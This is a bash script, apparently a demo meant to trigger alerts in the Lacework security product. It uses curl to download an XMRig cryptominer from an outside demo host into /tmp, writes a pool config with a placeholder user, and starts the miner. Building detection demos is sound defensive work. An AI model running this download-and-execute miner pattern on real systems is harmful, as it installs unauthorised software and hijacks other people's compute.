#!/usr/bin/env bash

set -e

if [ ! -f /tmp/xmrig-demo ]; then
  echo "[INFO] XMRig not found, downloading XMRig to /tmp/xmrig-demo now"
  curl http://lwmalwaredemo.com/xmrig -o /tmp/xmrig-demo --silent
  chmod +x /tmp/xmrig-demo
else
  echo "[INFO] XMRig present, skipping download"
fi

if [ ! -f /tmp/config-demo.json ]; then
  echo "[INFO] XMRig configuration not found, writing dummy config to /tmp/config-demo.json"
  config='{
    "algo": "cryptonight",
    "pools": [
        {
            "url": "pool.minexmr.com:4444",
            "user": "NOTAREALUSER",
            "pass": "x",
            "enabled": true,
        }
    ],
    "retries": 10,
    "retry-pause": 3,
    "watch": true
  }'
  echo $config > /tmp/config-demo.json
fi

if [ $(ps -ef | grep -v grep | grep xmrig-demo | awk '{print $2}'| wc -l) = "0" ]; then
  echo "[INFO] XMRig not running, starting now"
  /tmp/xmrig-demo -c /tmp/config-demo.json
else
  echo "[INFO] XMRig already running"
fi

echo ""
echo "Script complete. Check your Lacework console for activity in about an hour."